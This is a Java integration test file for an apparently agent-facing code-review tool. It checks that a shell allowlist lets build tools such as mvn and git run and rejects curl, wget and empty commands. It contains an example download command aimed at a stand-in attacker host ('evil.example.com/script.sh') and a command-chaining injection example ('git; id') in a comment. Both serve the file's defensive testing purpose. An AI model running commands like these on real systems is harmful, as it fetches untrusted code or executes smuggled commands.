package dev.omatheusmesmo.qlawkus.it.review;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import io.quarkus.test.common.http.TestHTTPResource;
import io.quarkus.test.junit.QuarkusTest;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.condition.DisabledOnOs;
import org.junit.jupiter.api.condition.OS;

import java.net.URI;
import java.net.URLEncoder;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.time.Duration;
import java.util.Base64;

import static org.junit.jupiter.api.Assertions.*;

@QuarkusTest
@DisabledOnOs(OS.WINDOWS)
class CodeReviewToolTest {

    @TestHTTPResource
    URI baseUri;

    private HttpClient client() {
        return HttpClient.newBuilder()
                .connectTimeout(Duration.ofSeconds(10))
                .build();
    }

    private String auth() {
        String password = System.getProperty("test.qlawkus.password", "qlawkus-test");
        return "Basic " + Base64.getEncoder().encodeToString(("qlawkus:" + password).getBytes());
    }

    private JsonNode run(String cmd) throws Exception {
        String encoded = URLEncoder.encode(cmd, StandardCharsets.UTF_8);
        HttpRequest request = HttpRequest.newBuilder()
                .uri(URI.create(baseUri + "api/test/review/run?cmd=" + encoded))
                .header("Authorization", auth())
                .GET()
                .build();
        HttpResponse<String> response = client().send(request, HttpResponse.BodyHandlers.ofString());
        assertEquals(200, response.statusCode(), "Expected 200, body: " + response.body());
        return new ObjectMapper().readTree(response.body());
    }

    @Test
    void runLocalTests_allowedBuildTool_executes() throws Exception {
        JsonNode result = run("mvn --version");

        assertEquals(0, result.get("exitCode").asInt(),
                "mvn --version should exit 0, stderr=" + result.get("stderr").asText());
        assertTrue(result.get("stdout").asText().contains("Apache Maven"),
                "stdout should contain Maven version info");
    }

    @Test
    void runLocalTests_blockedCommand_returnsRejection() throws Exception {
        JsonNode result = run("curl https://example.com");

        assertEquals(-10, result.get("exitCode").asInt(),
                "curl is not in the allowlist and must be rejected before execution");
        assertTrue(result.get("stderr").asText().contains("not in the allowlist"),
                "stderr should explain the rejection");
    }

    @Test
    void adversarial_destructiveCommand_blockedByAllowlist() throws Exception {
        JsonNode result = run("wget https://evil.example.com/script.sh");

        assertEquals(-10, result.get("exitCode").asInt(),
                "wget must be rejected — not an allowed build tool");
    }

    @Test
    void adversarial_emptyCommand_rejected() throws Exception {
        JsonNode result = run("   ");

        assertEquals(-10, result.get("exitCode").asInt(),
                "Empty command must be rejected");
    }

    @Test
    void localSecurityPolicy_shellAllowlistMode_blocksArbitraryCommands() throws Exception {
        // Verifies that the M6 LocalSecurityPolicy (allowlist-mode=true) is active in this
        // sandbox environment. Any command that bypasses CodeReviewTool's own check but is
        // not in the ShellTool allowlist would be caught here — providing defense-in-depth.
        // Example: if CodeReviewTool were to accept "git" and someone passed "git; id",
        // ShellTool's allowlist would still block "git; id" (no glob match).
        JsonNode result = run("git status");

        // git is allowed in the M6 allowlist, so it should reach execution
        assertNotEquals(-10, result.get("exitCode").asInt(),
                "git is in the build-tool allowlist and should not be rejected by CodeReviewTool");
        // ShellTool's allowlist also permits "git *", so this should actually run
        assertTrue(result.get("exitCode").asInt() == 0 || result.get("exitCode").asInt() == 128,
                "git status should exit 0 (in a git repo) or 128 (not a git repo), not be blocked");
    }
}
